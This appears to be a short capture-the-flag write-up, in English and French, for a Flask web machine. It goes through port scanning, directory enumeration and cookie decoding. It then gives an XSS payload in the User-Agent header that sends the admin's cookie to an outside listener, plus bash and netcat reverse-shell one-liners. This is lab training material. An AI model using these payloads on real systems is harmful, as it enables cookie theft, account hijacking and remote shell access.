# enum
```
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
1024/tcp  filtered kdm
1078/tcp  filtered avocent-proxy
5000/tcp  open     upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Mon, 25 Mar 2024 14:57:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5810/tcp  filtered unknown
6059/tcp  filtered X11:59
9080/tcp  filtered glrpc
32774/tcp filtered sometimes-rpc11
```

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://htb:5000/
```
	/dashboard
Je n'ais pas de droit d'acces à cette page il me faut donc récupérer le cookie de l'admin
## exploit
analyzing my cookie
```
flask-unsign --decode --cookie 'InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs'
```                       
	user
### xss
When i put a html tag in the message field in support page, i receive a warning message displaying my brower's informations such as *user agent*.
It say that admin will see those informations.
On peut donc tenter une xss pour récupérer le cookie de l'admin en remplaçant la valeur de l'attribut *user agent* de l'entête de la requête.
I have start a listeaner server
```
<img src= x onerror=fetch('http://10.10.16.49:8001/'+document.cookie);>
```

```
echo -n 'bash -i >& /dev/tcp/10.10.16.49/1234 0>&1' | base64 -w 0
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.16.49 1234 >/tmp/f
```
